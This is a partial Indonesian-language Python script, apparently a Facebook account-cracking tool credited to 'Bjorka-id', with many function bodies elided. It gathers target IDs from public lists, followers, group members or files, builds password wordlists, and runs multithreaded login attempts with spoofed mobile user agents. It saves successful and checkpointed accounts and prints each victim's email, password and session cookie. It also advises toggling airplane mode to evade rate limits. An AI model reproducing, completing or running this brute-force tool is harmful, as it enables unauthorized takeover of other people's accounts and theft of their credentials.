...
for xd in range(100):
    ...
    ugent2 = f"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"
    ugent3 = f"Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36",
...
os.system("clear")
print("\x1b[1;97m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("\x1b[1;97m┃╔═❲  Only Admin 089604289872❳═>")
print("\x1b[1;97m┃╚═════════════════════════════════")
print("\x1b[1;97m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("\x1b[1;97m┃╔═❲ TIDAK ADA KATA PERBAYAR❳═>")
print("\x1b[1;97m┃║• SEMUA GRATIS BROO ")
print("\x1b[1;97m️┃║• GITHUB: github.com/Bjorka-id")
print("\x1b[1;97m┃║• ANGGOTA: THE•SQUADteam")
print("\x1b[1;97m┃║• GOLONGAN: ANAK BAIK")
#print("\x1b[1;97m┃║•JIKA PENGEN DI HARGAI ANDA HARUS SOPAN
print("\x1b[1;97m┃╚═════════════════════════════════")
print("\x1b[1;97m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("\x1b[1;97m┃╔═❲ Masukin Pasword bro ❳═>")
print("\x1b[1;97m┃║• Passwordnya (enjoy123) ")
print("\x1b[1;97m┃╚═════════════════════════════════")
print("\x1b[1;97m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

input("\n\x1b[1;97m--> Masukan Password Anda Yang Sudah Ada Di Menu--> Enter")
Password = "enjoy123" # --> Data Req Api key --> open_kt(life)("enjoy123")

loop = 'true'
while (loop == 'true'):
    passcode = input("\x1b[1;97m--> Validasi Password? : ")
    if (passcode == Password):
            loop = 'false'
            time.sleep(5.0)
            print("\n \x1b[1;97m--> Mengecek Pasword... ")
            time.sleep(6.0)
            print("\n \x1b[1;92m--> Password Sukses ")          
    else:
            exit("\033[93m--> Password Anda Salah!!")
...
def logo():
	clear()
	print("""	
         \x1b[1;97m____ _  _ _    _   _    ___  ____ ____ _  _  --> Bjorka-id
         \x1b[1;97m|  | |\ | |     \_/     |__] |__/ |___ |\/|  --> OVER POWER
         \x1b[1;97m|__| | \| |___   |      |    |  \ |___ |  |  --> \033[32mONLY FREMIUM
                     \n\033[32mKEY YOUR -->  SUDAH DI MODIFIKASI -->HALAL BRO                                                                        
 """)
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def menu(my_name,my_id):
	...
	cetak(nel('\t𝚂𝙴𝙻𝙰𝙼𝙰𝚃 𝙳𝙰𝚃𝙰𝙽𝙶 [green]%s[white] ,𝙻𝚄 𝚃𝙾𝙻𝙾𝙻 𝚈𝙰? '%(my_name)))
	alvino_xy(f'[{h}•{x}] 𝚈𝙾𝚄𝚁 𝙸𝙳 : '+str(my_id))
	alvino_xy(f'[{h}•{x}] YOUR IP DEVICE  : {ip}')
	alvino_xy(f'[{h}•{x}] AUTHOR : BJORKA-ID')
	alvino_xy('[%s•%s] STATUS SC: %s𝙵𝚁𝙴𝙴%s ' %(H,N,H,N))
	alvino_xy('[%s•%s] DUKUNG PERIKOD : %sLOVE YOU%s '%(H,N,H,N))
	print('')
	print(' [%s1%s] CRACK PUBLIK       (%sON%s)'%(H,N,H,N));time.sleep(0.03) 
	print(' [%s2%s] CRACK FOLLOWERS    (%sON%s)'%(H,N,H,N));time.sleep(0.03) 
	print(' [%s3%s] CRACK ANGGOTA GRUP (%sON%s)'%(H,N,H,N));time.sleep(0.03)
	print(' [%s4%s] CRACK FILE       (%sON%s)'%(H,N,H,N));time.sleep(0.03) 
	print(' [%s5%s] LIAT HASIL CRACK '%(H,N));time.sleep(0.03) 
	print(' [%s0%s] KELUAR (%sHAPUS COOKIES COOKIES%s)'%(H,N,M,N));time.sleep(0.03) 
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input(f'[{hh}•{P}] MASUKAN JUMBLAH TARGET : '))
	except ValueError:
	...
	for met in range(jum):
		yz+=1
		kl = input(f'[{hh}•{P}] MASUKAN TARGET YANG KE : '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			...
			print('>> Sinyal Luh Kurang Bagus ')
			exit()
	try:
		print('')
		print(f'[{hh}•{P}] {b}TOTAL ID DARI TARGET{P} 🔥'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> Sinyal Luh Kurang Bagus ')
		...
		print(f'[{hh}•{P}]{k} UPS ACCOUNT PRIVAT/COOKIE ANDA MOKAD {x}')
		time.sleep(3)
		back()
def dump_pengikut():
	try:
		...
		exit()
	print('>> Ketik ( me ) JIKA INGIN CRACK FOLLOWERS SENDIRI')
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print( '[%s1%s] ACCOUNT OLD(%sNON-RECOMMEND%s)'%(H,N,M,N)) 
	print( '[%s2%s] ACCOUNT NEW(%sRECOMMEND%s)'%(H,N,H,N))
	print( '[%s3%s] ACCOUNT RANDOM(%sSANGAT RECOMMEND%s)'%(H,N,H,N))
	print('')
	hu = input(f'>> {b}Pilih:{P} ')
	if hu in ['1','01']:
		...
		print('>> Pilih Yang Bener bro ')
		exit()
	print(' [%s1%s] METODE MOBILE  (%sSANGAT RECOMEEND%s)'%(H,N,H,N))
	print(' [%s2%s] METODE MBASIC (%sLUMAYAN RECOMMEND%s)'%(H,N,H,N))
	print(' [%s3%s] METODE TOUCH  (%sKURANG TAU RECOMMEND%s)'%(H,N,M,N))
	print(' [%s4%s] METODE MOBILE TOUCH (%sPERCOBAAN RECOMMEND%s)'%(H,N,M,N))
	print('')
	hc = input(f'>> {b}Pilih :{P} ')
	if hc in ['1','01']:
		...
		method.append('mobile')
	print('')
	#elif _jembot_ = input('>> Tambahkan Aplikasi Terkait ( Y/t ) ')
	#if _jembot_ in ['']:
	...
	#else:
		#taplikasi.append('no')
	pwplus=input(f'[{hh}•{P}] {b}MAU MENAMBAHKAN PASSWORD TAMBAHAN?{P} ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] MASUKAN PASSWORD TAMBAHAN MINIMAL 6 DIGIT\n[[cyan]•[white]] DISARANKAN UNTUK MASUKAN NAMA PASSWORD/RANDOM ANDA\n[[cyan]•[white]] CONTOH :[green] SAYANG,INDONESIA,RAHASIA,JOKOWI[white] '))
		pwku=input(f'[{k}•{x}] MASUKAN PASSWORD TAMBAHAN: ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} {b}😎 NGEHECK SEDANG LIVE😎{P} {m}•{k}•{h}•{x} <<<<< ')
	print('')
	print(f'[{hh}•{P}] Hasil {h}OK{x} TERSIMPAN DI : {h}OK/%s {x}'%(okc))
	print(f'[{k}•{x}] Hasil {k}CP{x} TERSIMPAN DI : {k}CP/%s {x}'%(cpc))
	print(f'[•] ON/OFF MODE PESAWAT SETELAH {m}1K{x} ID\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]>>[green] CRACK SELESAI, UPDATE SC ADA DI GITHUB GUA YA : Github.com/Bjorka-id[cyan] <<[white] '))
	...
	if woi in ['y','Y']:
		...
		print(f'\t{x}>>{k} MAKASIH UDAH MENGUNAKAN SCRIPT INI{x} << ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[{hh}𝙵𝚁𝙴𝙴{P}] {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r{hh}SELAMAT ACCOUNT OK{P}  \n├─Email  : {hh}{idf}{P}          \n├──Sandi  : {hh}{pw}{P}  \n├──User Agent : {hh}{ua}{P}  \n└───Cookie : {hh}{kuki}{P}\n')
